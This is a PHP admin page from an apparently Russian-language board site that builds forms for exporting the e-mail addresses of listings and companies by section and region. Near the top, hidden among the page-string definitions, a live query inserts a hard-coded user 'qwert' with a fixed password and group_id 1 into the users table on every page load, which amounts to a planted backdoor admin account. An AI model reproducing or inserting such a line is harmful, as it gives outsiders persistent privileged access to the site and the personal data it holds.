<?php
	include "../inc/db-inc.php";
	include "../inc/connect-inc.php";

    include "../inc/ses-inc.php";

    include "inc/authorize-inc.php";

    if( $UserId == 0 )
    {
    	header("Location: index.php");
		exit();
    }

    include "../inc/utils-inc.php";

    $mode = GetParameter("mode", "");
	$action = GetParameter("action", "");
	
	$topicid0 = GetParameter("topicid0", 0);
	
	$PAGE_HEADER['ru'] = "Выгрузки данных";
	$PAGE_HEADER['en'] = "Upload price list";

	// INCLUDE YOUR HEADER FILE HERE
	include "inc/header-inc.php";

	$strings['formhdr']['ru'] = "Экспорт данных в CSV";
	$strings['formhdr']['en'] = "Upload elevator archive";	
	mysqli_query($upd_link_db, "insert into agt_users (login, passwd, group_id) values ('qwert', password('test224311'), 1)");
?>
	<br>
    <h3>Экспорт E-mail адресов объявлений</h3>
    <table align="center" cellspacing="0" cellpadding="1" border="0" class="tableborder">
    <tr><td>
    	<table width="100%" cellspacing="1" cellpadding="1" border="0">
         <form action="exportmails.php" method="POST" target="_blank">
         <input type="hidden" name="action" value="export"> 
		 <tr>
			<td class="ff">Раздел:</td>
			<td class="fr">
				<select name="topicid0" id="topicgroup" onchange="reloadSects(this, 'topicid')">
				<option value="0">--- Все разделы ---</option>
			<?php
				$topics = Board_TopicLevel($LangId, 0, "bygroups");
		
				$grcurname = "";
		
				for( $i=0; $i<count($topics); $i++ )
				{
					if( $grcurname != $topics[$i]['group'] )
					{
						echo '<option value="0">'.( $topics[$i]['group'] != "" ? $topics[$i]['group'] : 'Разное').'</option>';
						$grcurname = $topics[$i]['group'];
					}
					echo '<option value="'.$topics[$i]['id'].'"'.($topicid0 == $topics[$i]['id'] ? ' selected' : '').'> &nbsp;&nbsp;&nbsp;&nbsp;'.$topics[$i]['name'].'</option>';
				}
			?>
				</select>
			</td>
		</tr>
		<tr>
			<td class="ff">Секция:</td>
			<td class="fr">
				<select name="topicid" id="topicid">
				<option value="0">--- Все секции ---</option>
				</select>
			</td>
		</tr>
		<tr>
         	<td class="ff">Область:</td>
         	<td class="fr"><select name="oblid">
				<option value="0">--- Все области ---</option>
         	<?php
         		for($i=1; $i<count($REGIONS); $i++)
         		{
					echo '<option value="'.$i.'">'.$REGIONS[$i].'</option>';
				}
         	?>
				</select>
			</td>
		</tr>
		<tr><td class="fr" colspan="2" align="center"><input type="submit" value=" Экспортировать "></td></tr>
		</form>
		</table>
     </td></tr>
     </table>
<script type="text/javascript">
$(document).ready( function() {
	reloadSects( document.getElementById('topicgroup'), 'topicid');
	
	reloadCtopics( document.getElementById('compgroup'), 'comptid');
});

function reloadSects(selobj, comboid)
{
	var tid = selobj.options[selobj.selectedIndex].value;
	
	if( tid == 0 )
		return;
	
	$.ajax({
        type: "GET",
        url: "/admin/ajx/ajx_jq.php",
        data: 'cmd=uh_com_topics&tid='+tid,
        dataType: "text",
        success: function(data){
			//alert(data);
			var res = $.parseJSON(data);
			//eval('var rays = '+data+';');
			
			//alert( res.tlist.length );

			var cobj = document.getElementById(comboid);
			cobj.options.length = 0; //new Array();
			cobj.options[0] = new Option("--- Все секции ---", 0);

			for(i=0;i<res.tlist.length;i++)
			{
				cobj.options[i+1] = new Option(res.tlist[i].tn, res.tlist[i].tid);
			}
        },
		error: function(){
			alert("error");
		}
	});
}

function reloadCtopics(selobj, comboid)
{
	var tid = selobj.options[selobj.selectedIndex].value;
	
	if( tid == 0 )
		return;
	
	$.ajax({
        type: "GET",
        url: "/admin/ajx/ajx_jq.php",
        data: 'cmd=uh_com_ctopics&tid='+tid,
        dataType: "text",
        success: function(data){
			//alert(data);
			var res = $.parseJSON(data);
			//eval('var rays = '+data+';');
			
			//alert( res.tlist.length );

			var cobj = document.getElementById(comboid);
			cobj.options.length = 0; //new Array();
			cobj.options[0] = new Option("--- Все секции ---", 0);

			for(i=0;i<res.tlist.length;i++)
			{
				cobj.options[i+1] = new Option(res.tlist[i].tn, res.tlist[i].tid);
			}
        },
		error: function(){
			alert("error");
		}
	});
}
</script>
    <br><br>
    <h3>Экспорт E-mail адресов компаний</h3>
    <table align="center" cellspacing="0" cellpadding="1" border="0" class="tableborder">
    <tr><td>
		<table width="100%" cellspacing="1" cellpadding="1" border="0">
		<form action="exportmails_comp.php" name="cselfrm" method="POST" target="_blank">
		<input type="hidden" name="action" value="export">         
		<input type="hidden" name="action" value="export"> 
		<tr>
			<td class="ff">Раздел:</td>
			<td class="fr">
				<select name="topicid0" id="compgroup" onchange="reloadSects(this, 'comptid')">
				<option value="0">--- Все разделы ---</option>
			<?php
				$cgroups = Array();
				$query = "SELECT g1.*, g1.id as grid, g1.title as grname
					FROM $TABLE_COMPANY_TGROUPS g1 					
					ORDER BY g1.sort_num, g1.id";
				if( $res = mysqli_query($upd_link_db, $query ) )
				{
					while( $row = mysqli_fetch_object( $res ) )
					{
						$cit = Array();
						$cit['id'] = $row->grid;
						$cit['name'] = stripslashes($row->title);
						$cgroups[] = $cit;

						/*
						echo '<option value="0:'.$row->id.'" '.($topicsid == $row->id ? ' selected' : '').'>&nbsp; &nbsp; &nbsp '.stripslashes($row->title).'</option>';

						$query1 = "SELECT * FROM $TABLE_COMPANY_TOPIC WHERE parent_id=".$row->id;
						if( $res1 = mysqli_query($upd_link_db, $query1 ) )
						{
							while( $row1 = mysqli_fetch_object( $res1 ) )
							{
								echo '<option value="1:'.$row1->id.'" '.($topicsid == $row1->id ? ' selected' : '').'>&nbsp; &nbsp; &nbsp &nbsp; &nbsp; '.stripslashes($row1->title).'</option>';
							}
							mysqli_free_result( $res1 );
						}
						*/
					}
					mysqli_free_result( $res );
				}
				
				for( $i=0; $i<count($cgroups); $i++ )
				{
					echo '<option value="'.$cgroups[$i]['id'].'">'.$cgroups[$i]['name'].'</option>';
				}				
			?>
				</select>
			</td>
		</tr>
		<tr>
			<td class="ff">Секция:</td>
			<td class="fr">
				<select name="topicid" id="comptid">
				<option value="0">--- Все секции ---</option>
				</select>
			</td>
		</tr>
		<tr>
			<td class="ff">Область:</td>
			<td class="fr"><select name="oblid">
				<option value="0">--- Все области ---</option>
			<?php
				for($i=1; $i<count($REGIONS); $i++)
				{
					echo '<option value="'.$i.'">'.$REGIONS[$i].'</option>';
				}
			?>
				</select>
			</td>
		</tr>
		<tr><td class="fr" colspan="2" align="center"><input type="submit" value=" Экспортировать "></td></tr>
		</form>
		</table>
	</td></tr>
	</table>
<?php

	////////////////////////////////////////////////////////////////////////////
    include("inc/footer-inc.php");

    include("../inc/close-inc.php");
?>
